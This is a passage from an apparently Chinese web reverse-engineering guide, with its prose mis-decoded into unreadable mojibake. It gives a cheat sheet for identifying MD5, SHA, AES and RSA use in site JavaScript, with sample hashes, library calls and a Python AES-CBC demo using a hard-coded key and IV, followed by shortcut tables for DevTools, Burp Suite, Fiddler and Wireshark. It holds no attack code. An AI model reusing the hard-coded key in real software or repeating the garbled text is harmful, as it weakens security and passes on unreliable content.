                                                <h1>R63: åŠ å¯†ç®—æ³•ç‰¹å¾é€ŸæŸ¥è¡¨</h1>
<h2>è¾“å‡ºé•¿åº¦ç‰¹å¾</h2>
<table>
<thead>
<tr>
  <th>ç®—æ³•</th>
  <th>è¾“å‡ºé•¿åº¦</th>
  <th>è¾“å‡ºæ ¼å¼</th>
  <th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>MD5</strong></td>
  <td>32 å­—ç¬¦</td>
  <td>åå…­è¿›åˆ¶</td>
  <td><code>5d41402abc4b2a76b9719d911017c592</code></td>
</tr>
<tr>
  <td><strong>SHA1</strong></td>
  <td>40 å­—ç¬¦</td>
  <td>åå…­è¿›åˆ¶</td>
  <td><code>aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d</code></td>
</tr>
<tr>
  <td><strong>SHA256</strong></td>
  <td>64 å­—ç¬¦</td>
  <td>åå…­è¿›åˆ¶</td>
  <td><code>e3b0c44298fc1c149afbf4c8996fb...</code></td>
</tr>
<tr>
  <td><strong>SHA512</strong></td>
  <td>128 å­—ç¬¦</td>
  <td>åå…­è¿›åˆ¶</td>
  <td><code>cf83e1357eefb8bdf1542850d66d8...</code></td>
</tr>
<tr>
  <td><strong>AES</strong></td>
  <td>å¯å˜</td>
  <td>Base64</td>
  <td><code>U2FsdGVkX1+LpXMIpGBwDA==</code></td>
</tr>
<tr>
  <td><strong>RSA-2048</strong></td>
  <td>256 å­—èŠ‚</td>
  <td>Base64</td>
  <td>é•¿å­—ç¬¦ä¸²</td>
</tr>
</tbody>
</table>
<h2>JavaScript åº“ç‰¹å¾</h2>
<h3>CryptoJS</h3>
<pre><code class="language-javascript">// ç‰¹å¾ä»£ç 
CryptoJS.MD5(text);
CryptoJS.SHA256(text);
CryptoJS.AES.encrypt(text, key);
CryptoJS.enc.Base64.stringify();
CryptoJS.lib.WordArray;
</code></pre>
<p><strong>è¯†åˆ«è¦ç‚¹</strong>:</p>
<ul>
<li>å…¨å±€å˜é‡ <code>CryptoJS</code></li>
<li>å¼•å…¥ CDN: <code>crypto-js.min.js</code></li>
<li>æ–¹æ³•è°ƒç”¨æ ¼å¼: <code>CryptoJS.ç®—æ³•å.æ–¹æ³•</code></li>
</ul>
<h3>crypto (Node.js)</h3>
<pre><code class="language-javascript">const crypto = require(&quot;crypto&quot;);

// MD5
crypto.createHash(&quot;md5&quot;).update(text).digest(&quot;hex&quot;);

// HMAC
crypto.createHmac(&quot;sha256&quot;, key).update(text).digest(&quot;hex&quot;);

// AES
const cipher = crypto.createCipheriv(&quot;aes-256-cbc&quot;, key, iv);
</code></pre>
<h3>Web Crypto API</h3>
<pre><code class="language-javascript">// ç‰¹å¾ä»£ç 
window.crypto.subtle.digest(&quot;SHA-256&quot;, data);
window.crypto.subtle.encrypt(algorithm, key, data);
window.crypto.getRandomValues(array);
</code></pre>
<h2>å¸¸è§åŠ å¯†æ¨¡å¼</h2>
<h3>å¯¹ç§°åŠ å¯†ï¼ˆAESï¼‰</h3>
<table>
<thead>
<tr>
  <th>æ¨¡å¼</th>
  <th>ç‰¹å¾</th>
  <th>å‚æ•°</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>AES-ECB</strong></td>
  <td>æœ€ç®€å•ï¼Œä¸å®‰å…¨</td>
  <td>åªéœ€ key</td>
</tr>
<tr>
  <td><strong>AES-CBC</strong></td>
  <td>éœ€è¦ IV</td>
  <td>key + iv</td>
</tr>
<tr>
  <td><strong>AES-CTR</strong></td>
  <td>è®¡æ•°å™¨æ¨¡å¼</td>
  <td>key + counter</td>
</tr>
<tr>
  <td><strong>AES-GCM</strong></td>
  <td>è®¤è¯åŠ å¯†</td>
  <td>key + iv + tag</td>
</tr>
</tbody>
</table>
<p><strong>è¯†åˆ«ç¤ºä¾‹</strong>:</p>
<pre><code class="language-javascript">// CBC æ¨¡å¼
CryptoJS.AES.encrypt(text, key, {
  iv: iv,
  mode: CryptoJS.mode.CBC,
  padding: CryptoJS.pad.Pkcs7,
});
</code></pre>
<h3>éå¯¹ç§°åŠ å¯†ï¼ˆRSAï¼‰</h3>
<pre><code class="language-javascript">// JSEncrypt ç‰¹å¾
const encrypt = new JSEncrypt();
encrypt.setPublicKey(publicKey);
const encrypted = encrypt.encrypt(text);
</code></pre>
<h2>Hash ç®—æ³•ç‰¹å¾è¡¨</h2>
<table>
<thead>
<tr>
  <th>è¾“å…¥</th>
  <th>MD5</th>
  <th>SHA1</th>
  <th>SHA256</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>&quot;&quot;</code> (ç©ºå­—ç¬¦ä¸²)</td>
  <td><code>d41d8cd98f00b204...</code></td>
  <td><code>da39a3ee5e6b4b0d...</code></td>
  <td><code>e3b0c44298fc1c14...</code></td>
</tr>
<tr>
  <td><code>&quot;a&quot;</code></td>
  <td><code>0cc175b9c0f1b6a8...</code></td>
  <td><code>86f7e437faa5a7fc...</code></td>
  <td><code>ca978112ca1bbdca...</code></td>
</tr>
<tr>
  <td><code>&quot;123456&quot;</code></td>
  <td><code>e10adc3949ba59ab...</code></td>
  <td><code>7c4a8d09ca3762af...</code></td>
  <td><code>8d969eef6ecad3c2...</code></td>
</tr>
</tbody>
</table>
<p><strong>å¿«é€ŸéªŒè¯</strong>:</p>
<pre><code class="language-python">import hashlib
hashlib.md5(b'123456').hexdigest()
# 'e10adc3949ba59abbe56e057f20f883e'
</code></pre>
<h2>æ··æ·†åçš„è¯†åˆ«</h2>
<h3>ç‰¹å¾å­—ç¬¦ä¸²</h3>
<p>æœç´¢è¿™äº›å…³é”®å­—ï¼š</p>
<pre><code>&quot;MD5&quot;
&quot;SHA&quot;
&quot;AES&quot;
&quot;RSA&quot;
&quot;encrypt&quot;
&quot;decrypt&quot;
&quot;cipher&quot;
&quot;hash&quot;
&quot;digest&quot;
&quot;0123456789ABCDEF&quot;  // åå…­è¿›åˆ¶å­—ç¬¦é›†
&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;  // Base64
</code></pre>
<h3>ç‰¹å¾å‡½æ•°</h3>
<pre><code class="language-javascript">// MD5 ç‰¹å¾ - å¸¸é‡
0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476

// AES ç‰¹å¾ - S-Box
[0x63, 0x7c, 0x77, 0x7b, ...]

// Base64 ç‰¹å¾
&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;
</code></pre>
<h2>åŠ å¯†å‚æ•°å¸¸è§åç§°</h2>
<table>
<thead>
<tr>
  <th>ç”¨é€”</th>
  <th>å¸¸è§å˜é‡å</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>å¯†é’¥</strong></td>
  <td><code>key</code>, <code>secret</code>, <code>secretKey</code>, <code>password</code></td>
</tr>
<tr>
  <td><strong>åˆå§‹å‘é‡</strong></td>
  <td><code>iv</code>, <code>ivBytes</code>, <code>nonce</code></td>
</tr>
<tr>
  <td><strong>ç›</strong></td>
  <td><code>salt</code>, <code>randomSalt</code></td>
</tr>
<tr>
  <td><strong>ç­¾å</strong></td>
  <td><code>sign</code>, <code>signature</code>, <code>hash</code></td>
</tr>
<tr>
  <td><strong>æ—¶é—´æˆ³</strong></td>
  <td><code>timestamp</code>, <code>ts</code>, <code>time</code>, <code>nonce</code></td>
</tr>
</tbody>
</table>
<h2>å¿«é€Ÿè¯†åˆ«æµç¨‹</h2>
<pre><code class="language-mermaid">graph TD
    A[å‘ç°åŠ å¯†å­—ç¬¦ä¸²] --&gt; B{æ£€æŸ¥é•¿åº¦}
    B --&gt;|32å­—ç¬¦| C[å¯èƒ½æ˜¯MD5]
    B --&gt;|40å­—ç¬¦| D[å¯èƒ½æ˜¯SHA1]
    B --&gt;|64å­—ç¬¦| E[å¯èƒ½æ˜¯SHA256]
    B --&gt;|å¯å˜é•¿åº¦| F{æ£€æŸ¥æ ¼å¼}
    F --&gt;|Base64| G[å¯èƒ½æ˜¯AES]
    F --&gt;|åå…­è¿›åˆ¶| H[æ£€æŸ¥æ˜¯å¦æ˜¯Hash]
</code></pre>
<h2>Python å®ç°å¯¹ç…§</h2>
<pre><code class="language-python">import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import base64

# MD5
hashlib.md5(b'text').hexdigest()

# SHA256
hashlib.sha256(b'text').hexdigest()

# HMAC-SHA256
import hmac
hmac.new(b'key', b'text', hashlib.sha256).hexdigest()

# AES-CBC åŠ å¯†
key = b'1234567890abcdef'  # 16å­—èŠ‚
iv = b'abcdefghijklmnop'   # 16å­—èŠ‚
cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(pad(b'plaintext', AES.block_size))
encrypted_b64 = base64.b64encode(encrypted)

# AES-CBC è§£å¯†
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = unpad(cipher.decrypt(base64.b64decode(encrypted_b64)), AES.block_size)
</code></pre>
<h2>å¸¸è§åŠ å¯†åº“ CDN</h2>
<p>è¯†åˆ«ä½¿ç”¨çš„åŠ å¯†åº“ï¼š</p>
<pre><code class="language-html">&lt;!-- CryptoJS --&gt;
&lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js&quot;&gt;&lt;/script&gt;

&lt;!-- JSEncrypt (RSA) --&gt;
&lt;script src=&quot;https://cdn.jsdelivr.net/npm/jsencrypt/bin/jsencrypt.min.js&quot;&gt;&lt;/script&gt;

&lt;!-- Forge --&gt;
&lt;script src=&quot;https://cdn.jsdelivr.net/npm/node-forge/dist/forge.min.js&quot;&gt;&lt;/script&gt;

&lt;!-- sjcl (Stanford JavaScript Crypto Library) --&gt;
&lt;script src=&quot;https://bitwiseshiftleft.github.io/sjcl/sjcl.js&quot;&gt;&lt;/script&gt;
</code></pre>
<h2>ğŸ“š ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-29">åŠ å¯†ç®—æ³•è¯†åˆ«</a></li>
<li><a href="#section-3">è§£å¯† API å‚æ•°</a></li>
<li><a href="#section-61">åŠ å¯†æ£€æµ‹è„šæœ¬</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-65">
                                                <h2>[R64] Tool Shortcuts</h2>
                                                <h1>R64: å·¥å…·å¿«æ·é”®é€ŸæŸ¥è¡¨</h1>
<h2>Chrome DevTools</h2>
<h3>æ‰“å¼€/åˆ‡æ¢é¢æ¿</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>F12</code></td>
  <td>æ‰“å¼€/å…³é—­ DevTools</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+I</code> (Win) / <code>Cmd+Option+I</code> (Mac)</td>
  <td>æ‰“å¼€/å…³é—­ DevTools</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+J</code> (Win) / <code>Cmd+Option+J</code> (Mac)</td>
  <td>ç›´æ¥æ‰“å¼€ Console</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+C</code> (Win) / <code>Cmd+Option+C</code> (Mac)</td>
  <td>å…ƒç´ æ£€æŸ¥æ¨¡å¼</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+M</code> (Win) / <code>Cmd+Shift+M</code> (Mac)</td>
  <td>è®¾å¤‡æ¨¡æ‹Ÿæ¨¡å¼</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+P</code> (Win) / <code>Cmd+Shift+P</code> (Mac)</td>
  <td>å‘½ä»¤é¢æ¿</td>
</tr>
<tr>
  <td><code>Ctrl+[</code> / <code>Ctrl+]</code></td>
  <td>åˆ‡æ¢é¢æ¿</td>
</tr>
<tr>
  <td><code>Esc</code></td>
  <td>æ˜¾ç¤º/éšè—æŠ½å±‰ (Console)</td>
</tr>
</tbody>
</table>
<h3>Sources é¢æ¿</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>F8</code></td>
  <td>æš‚åœ/ç»§ç»­</td>
</tr>
<tr>
  <td><code>F9</code></td>
  <td>è®¾ç½®/å–æ¶ˆæ–­ç‚¹</td>
</tr>
<tr>
  <td><code>F10</code></td>
  <td>å•æ­¥è·³è¿‡</td>
</tr>
<tr>
  <td><code>F11</code></td>
  <td>å•æ­¥è¿›å…¥</td>
</tr>
<tr>
  <td><code>Shift+F11</code></td>
  <td>å•æ­¥è·³å‡º</td>
</tr>
<tr>
  <td><code>Ctrl+F</code></td>
  <td>æœç´¢æ–‡ä»¶</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+F</code></td>
  <td>å…¨å±€æœç´¢</td>
</tr>
<tr>
  <td><code>Ctrl+G</code></td>
  <td>è·³è½¬åˆ°è¡Œ</td>
</tr>
<tr>
  <td><code>Ctrl+O</code> / <code>Ctrl+P</code></td>
  <td>æ‰“å¼€æ–‡ä»¶</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+O</code></td>
  <td>è·³è½¬åˆ°å‡½æ•°</td>
</tr>
</tbody>
</table>
<h3>Console é¢æ¿</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+L</code></td>
  <td>æ¸…ç©º Console</td>
</tr>
<tr>
  <td><code>â†‘</code> / <code>â†“</code></td>
  <td>å†å²å‘½ä»¤å¯¼èˆª</td>
</tr>
<tr>
  <td><code>Tab</code></td>
  <td>è‡ªåŠ¨è¡¥å…¨</td>
</tr>
<tr>
  <td><code>Ctrl+U</code></td>
  <td>æ¸…é™¤å½“å‰è¾“å…¥</td>
</tr>
</tbody>
</table>
<h3>Elements é¢æ¿</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>â†‘</code> / <code>â†“</code></td>
  <td>å¯¼èˆª DOM æ ‘</td>
</tr>
<tr>
  <td><code>â†’</code></td>
  <td>å±•å¼€èŠ‚ç‚¹</td>
</tr>
<tr>
  <td><code>â†</code></td>
  <td>æ”¶èµ·èŠ‚ç‚¹</td>
</tr>
<tr>
  <td><code>F2</code></td>
  <td>ç¼–è¾‘ HTML</td>
</tr>
<tr>
  <td><code>Delete</code></td>
  <td>åˆ é™¤èŠ‚ç‚¹</td>
</tr>
<tr>
  <td><code>Ctrl+Z</code></td>
  <td>æ’¤é”€</td>
</tr>
<tr>
  <td><code>H</code></td>
  <td>éšè—/æ˜¾ç¤ºå…ƒç´ </td>
</tr>
</tbody>
</table>
<h3>Network é¢æ¿</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+R</code></td>
  <td>é‡æ–°åŠ è½½</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+R</code></td>
  <td>å¼ºåˆ¶é‡æ–°åŠ è½½</td>
</tr>
<tr>
  <td><code>Ctrl+E</code></td>
  <td>å¼€å§‹/åœæ­¢å½•åˆ¶</td>
</tr>
<tr>
  <td><code>Ctrl+F</code></td>
  <td>æœç´¢è¯·æ±‚</td>
</tr>
</tbody>
</table>
<hr />
<h2>VS Code</h2>
<h3>é€šç”¨</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+P</code></td>
  <td>å¿«é€Ÿæ‰“å¼€æ–‡ä»¶</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+P</code></td>
  <td>å‘½ä»¤é¢æ¿</td>
</tr>
<tr>
  <td><code>Ctrl+B</code></td>
  <td>åˆ‡æ¢ä¾§è¾¹æ </td>
</tr>
<tr>
  <td><code>Ctrl+\</code></td>
  <td>æ‹†åˆ†ç¼–è¾‘å™¨</td>
</tr>
<tr>
  <td><code>Ctrl+W</code></td>
  <td>å…³é—­ç¼–è¾‘å™¨</td>
</tr>
<tr>
  <td><code>Ctrl+Tab</code></td>
  <td>åˆ‡æ¢ç¼–è¾‘å™¨</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+N</code></td>
  <td>æ–°çª—å£</td>
</tr>
</tbody>
</table>
<h3>ç¼–è¾‘</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+X</code></td>
  <td>å‰ªåˆ‡è¡Œ</td>
</tr>
<tr>
  <td><code>Ctrl+C</code></td>
  <td>å¤åˆ¶è¡Œ</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+K</code></td>
  <td>åˆ é™¤è¡Œ</td>
</tr>
<tr>
  <td><code>Alt+â†‘/â†“</code></td>
  <td>ç§»åŠ¨è¡Œ</td>
</tr>
<tr>
  <td><code>Shift+Alt+â†‘/â†“</code></td>
  <td>å¤åˆ¶è¡Œ</td>
</tr>
<tr>
  <td><code>Ctrl+/</code></td>
  <td>åˆ‡æ¢æ³¨é‡Š</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+[</code> / <code>]</code></td>
  <td>æŠ˜å /å±•å¼€ä»£ç å—</td>
</tr>
<tr>
  <td><code>Ctrl+D</code></td>
  <td>é€‰æ‹©ä¸‹ä¸€ä¸ªç›¸åŒå†…å®¹</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+L</code></td>
  <td>é€‰æ‹©æ‰€æœ‰ç›¸åŒå†…å®¹</td>
</tr>
<tr>
  <td><code>Alt+Click</code></td>
  <td>å¤šå…‰æ ‡</td>
</tr>
</tbody>
</table>
<h3>æœç´¢/æ›¿æ¢</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+F</code></td>
  <td>æŸ¥æ‰¾</td>
</tr>
<tr>
  <td><code>Ctrl+H</code></td>
  <td>æ›¿æ¢</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+F</code></td>
  <td>å…¨å±€æŸ¥æ‰¾</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+H</code></td>
  <td>å…¨å±€æ›¿æ¢</td>
</tr>
<tr>
  <td><code>F3</code> / <code>Shift+F3</code></td>
  <td>æŸ¥æ‰¾ä¸‹ä¸€ä¸ª/ä¸Šä¸€ä¸ª</td>
</tr>
</tbody>
</table>
<h3>è°ƒè¯•</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>F5</code></td>
  <td>å¼€å§‹/ç»§ç»­è°ƒè¯•</td>
</tr>
<tr>
  <td><code>F9</code></td>
  <td>åˆ‡æ¢æ–­ç‚¹</td>
</tr>
<tr>
  <td><code>F10</code></td>
  <td>å•æ­¥è·³è¿‡</td>
</tr>
<tr>
  <td><code>F11</code></td>
  <td>å•æ­¥è¿›å…¥</td>
</tr>
<tr>
  <td><code>Shift+F11</code></td>
  <td>å•æ­¥è·³å‡º</td>
</tr>
<tr>
  <td><code>Shift+F5</code></td>
  <td>åœæ­¢è°ƒè¯•</td>
</tr>
</tbody>
</table>
<hr />
<h2>Burp Suite</h2>
<h3>é€šç”¨</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+Shift+P</code></td>
  <td>å‰è¿›åˆ°ä¸‹ä¸€ä¸ªæ ‡ç­¾é¡µ</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+N</code></td>
  <td>åé€€åˆ°ä¸Šä¸€ä¸ªæ ‡ç­¾é¡µ</td>
</tr>
<tr>
  <td><code>Ctrl+T</code></td>
  <td>è½¬å‘è¯·æ±‚åˆ°å…¶ä»–å·¥å…·</td>
</tr>
</tbody>
</table>
<h3>Proxy æ‹¦æˆª</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+F</code></td>
  <td>è½¬å‘è¯·æ±‚</td>
</tr>
<tr>
  <td><code>Ctrl+D</code></td>
  <td>ä¸¢å¼ƒè¯·æ±‚</td>
</tr>
<tr>
  <td><code>Ctrl+I</code></td>
  <td>åˆ‡æ¢æ‹¦æˆªå¼€/å…³</td>
</tr>
<tr>
  <td><code>Ctrl+R</code></td>
  <td>å‘é€åˆ° Repeater</td>
</tr>
<tr>
  <td><code>Ctrl+S</code></td>
  <td>å‘é€åˆ° Scanner</td>
</tr>
</tbody>
</table>
<h3>Repeater</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+Space</code></td>
  <td>å‘é€è¯·æ±‚</td>
</tr>
<tr>
  <td><code>Ctrl+R</code></td>
  <td>åˆ‡æ¢åŸå§‹/ç¾åŒ–è§†å›¾</td>
</tr>
</tbody>
</table>
<h3>Intruder</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+I</code></td>
  <td>å¼€å§‹æ”»å‡»</td>
</tr>
</tbody>
</table>
<hr />
<h2>Fiddler</h2>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>F12</code></td>
  <td>å¼€å§‹/åœæ­¢æ•è·</td>
</tr>
<tr>
  <td><code>F5</code></td>
  <td>åˆ·æ–°ä¼šè¯åˆ—è¡¨</td>
</tr>
<tr>
  <td><code>F2</code></td>
  <td>ä¸ºä¼šè¯æ·»åŠ æ³¨é‡Š</td>
</tr>
<tr>
  <td><code>Ctrl+X</code></td>
  <td>åˆ é™¤æ‰€æœ‰ä¼šè¯</td>
</tr>
<tr>
  <td><code>Ctrl+F</code></td>
  <td>æŸ¥æ‰¾ä¼šè¯</td>
</tr>
<tr>
  <td><code>Shift+Del</code></td>
  <td>åˆ é™¤é€‰ä¸­ä¼šè¯</td>
</tr>
<tr>
  <td><code>U</code></td>
  <td>è§£å‹ç¼©å“åº”</td>
</tr>
<tr>
  <td><code>D</code></td>
  <td>è§£ç é€‰ä¸­çš„æ–‡æœ¬</td>
</tr>
<tr>
  <td><code>B</code></td>
  <td>åœ¨ Brea å‰ kpoint</td>
</tr>
</tbody>
</table>
<hr />
<h2>Charles</h2>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Cmd+R</code> (Mac) / <code>Ctrl+R</code> (Win)</td>
  <td>å¼€å§‹/åœæ­¢å½•åˆ¶</td>
</tr>
<tr>
  <td><code>Cmd+K</code></td>
  <td>æ¸…ç©ºä¼šè¯</td>
</tr>
<tr>
  <td><code>Cmd+F</code></td>
  <td>æŸ¥æ‰¾</td>
</tr>
<tr>
  <td><code>Cmd+E</code></td>
  <td>å¯ç”¨/ç¦ç”¨æ–­ç‚¹</td>
</tr>
</tbody>
</table>
<hr />
<h2>Python IDE (PyCharm)</h2>
<h3>å¯¼èˆª</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+N</code></td>
  <td>æŸ¥æ‰¾ç±»</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+N</code></td>
  <td>æŸ¥æ‰¾æ–‡ä»¶</td>
</tr>
<tr>
  <td><code>Ctrl+B</code></td>
  <td>è·³è½¬åˆ°å®šä¹‰</td>
</tr>
<tr>
  <td><code>Ctrl+Alt+â†</code></td>
  <td>åé€€</td>
</tr>
<tr>
  <td><code>Ctrl+Alt+â†’</code></td>
  <td>å‰è¿›</td>
</tr>
</tbody>
</table>
<h3>ç¼–è¾‘</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+D</code></td>
  <td>å¤åˆ¶è¡Œ</td>
</tr>
<tr>
  <td><code>Ctrl+Y</code></td>
  <td>åˆ é™¤è¡Œ</td>
</tr>
<tr>
  <td><code>Ctrl+/</code></td>
  <td>æ³¨é‡Š/å–æ¶ˆæ³¨é‡Š</td>
</tr>
<tr>
  <td><code>Ctrl+Alt+L</code></td>
  <td>æ ¼å¼åŒ–ä»£ç </td>
</tr>
<tr>
  <td><code>Ctrl+Space</code></td>
  <td>ä»£ç è¡¥å…¨</td>
</tr>
</tbody>
</table>
<h3>è°ƒè¯•</h3>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Shift+F9</code></td>
  <td>è°ƒè¯•</td>
</tr>
<tr>
  <td><code>F8</code></td>
  <td>å•æ­¥è·³è¿‡</td>
</tr>
<tr>
  <td><code>F7</code></td>
  <td>å•æ­¥è¿›å…¥</td>
</tr>
<tr>
  <td><code>Shift+F8</code></td>
  <td>å•æ­¥è·³å‡º</td>
</tr>
<tr>
  <td><code>F9</code></td>
  <td>ç»§ç»­æ‰§è¡Œ</td>
</tr>
<tr>
  <td><code>Ctrl+F8</code></td>
  <td>åˆ‡æ¢æ–­ç‚¹</td>
</tr>
</tbody>
</table>
<hr />
<h2>æµè§ˆå™¨é€šç”¨</h2>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+T</code></td>
  <td>æ–°æ ‡ç­¾é¡µ</td>
</tr>
<tr>
  <td><code>Ctrl+W</code></td>
  <td>å…³é—­æ ‡ç­¾é¡µ</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+T</code></td>
  <td>é‡æ–°æ‰“å¼€å…³é—­çš„æ ‡ç­¾é¡µ</td>
</tr>
<tr>
  <td><code>Ctrl+Tab</code></td>
  <td>ä¸‹ä¸€ä¸ªæ ‡ç­¾é¡µ</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+Tab</code></td>
  <td>ä¸Šä¸€ä¸ªæ ‡ç­¾é¡µ</td>
</tr>
<tr>
  <td><code>Ctrl+L</code></td>
  <td>åœ°å€æ </td>
</tr>
<tr>
  <td><code>Ctrl+D</code></td>
  <td>æ·»åŠ ä¹¦ç­¾</td>
</tr>
<tr>
  <td><code>Ctrl+H</code></td>
  <td>å†å²è®°å½•</td>
</tr>
<tr>
  <td><code>Ctrl+J</code></td>
  <td>ä¸‹è½½è®°å½•</td>
</tr>
<tr>
  <td><code>F5</code></td>
  <td>åˆ·æ–°</td>
</tr>
<tr>
  <td><code>Ctrl+F5</code></td>
  <td>å¼ºåˆ¶åˆ·æ–°ï¼ˆæ¸…é™¤ç¼“å­˜ï¼‰</td>
</tr>
<tr>
  <td><code>Ctrl+U</code></td>
  <td>æŸ¥çœ‹æºä»£ç </td>
</tr>
<tr>
  <td><code>Ctrl+Shift+Delete</code></td>
  <td>æ¸…é™¤æµè§ˆæ•°æ®</td>
</tr>
</tbody>
</table>
<hr />
<h2>Wireshark</h2>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+E</code></td>
  <td>å¼€å§‹/åœæ­¢æ•è·</td>
</tr>
<tr>
  <td><code>Ctrl+W</code></td>
  <td>å…³é—­æ•è·</td>
</tr>
<tr>
  <td><code>Ctrl+R</code></td>
  <td>é‡æ–°åŠ è½½</td>
</tr>
<tr>
  <td><code>Ctrl+F</code></td>
  <td>æŸ¥æ‰¾æ•°æ®åŒ…</td>
</tr>
<tr>
  <td><code>Ctrl+G</code></td>
  <td>è·³è½¬åˆ°æ•°æ®åŒ…</td>
</tr>
<tr>
  <td><code>Ctrl+M</code></td>
  <td>æ ‡è®°æ•°æ®åŒ…</td>
</tr>
<tr>
  <td><code>Ctrl+B</code></td>
  <td>æŸ¥æ‰¾ä¸‹ä¸€ä¸ªæ ‡è®°</td>
</tr>
</tbody>
</table>
<hr />
<h2>Git GUI (SourceTree)</h2>
<table>
<thead>
<tr>
  <th>å¿«æ·é”®</th>
  <th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><code>Ctrl+1</code></td>
  <td>File Status</td>
</tr>
<tr>
  <td><code>Ctrl+2</code></td>
  <td>History</td>
</tr>
<tr>
  <td><code>Ctrl+3</code></td>
  <td>Search</td>
</tr>
<tr>
  <td><code>Ctrl+R</code></td>
  <td>Refresh</td>
</tr>
<tr>
  <td><code>Ctrl+P</code></td>
  <td>Push</td>
</tr>
<tr>
  <td><code>Ctrl+Shift+P</code></td>
  <td>Pull</td>
</tr>
</tbody>
</table>
<hr />
<h2>è‡ªå®šä¹‰å¿«æ·é”®å»ºè®®</h2>
<p>ä¸ºå¸¸ç”¨æ“ä½œè®¾ç½®å¿«æ·é”®å¯ä»¥å¤§å¹…æé«˜æ•ˆç‡ï¼š</p>
<h3>Chrome Snippets</h3>
<ol>
<li>DevTools â†’ Sources â†’ Snippets</li>
<li>åˆ›å»ºå¸¸ç”¨ Hook è„šæœ¬</li>
<li>å³é”® â†’ &quot;Run&quot; æˆ–æŒ‰ <code>Ctrl+Enter</code></li>
</ol>
